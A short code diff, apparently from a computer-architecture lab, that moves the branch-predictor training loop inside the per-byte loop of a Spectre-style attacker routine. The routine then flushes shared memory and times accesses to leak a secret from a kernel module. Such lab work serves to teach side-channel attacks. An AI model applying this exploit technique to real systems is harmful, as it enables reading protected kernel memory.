@@ -43,21 +43,20 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     uint64_t threshold = 185; 
 
 
-    //Step 1 : Train the branch predictor 
-
-    for (int i =0; i<200; i++) {
-        call_kernel_part2 (kernel_fd, shared_memory, 1);
-        call_kernel_part2 (kernel_fd, shared_memory, 2);
-        call_kernel_part2 (kernel_fd, shared_memory, 3);
-        call_kernel_part2 (kernel_fd, shared_memory, 4);
-    }
-
-
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
         uint64_t access_time;
+
+        //Step 1 : Train the branch predictor 
+
+        for (int i =0; i<200; i++) {
+            call_kernel_part2 (kernel_fd, shared_memory, 1);
+            call_kernel_part2 (kernel_fd, shared_memory, 2);
+            call_kernel_part2 (kernel_fd, shared_memory, 3);
+            call_kernel_part2 (kernel_fd, shared_memory, 4);
+        } 
 
         // Step1 : Flush the shared memory 
         for (int block = 0; block < 256; block++) {
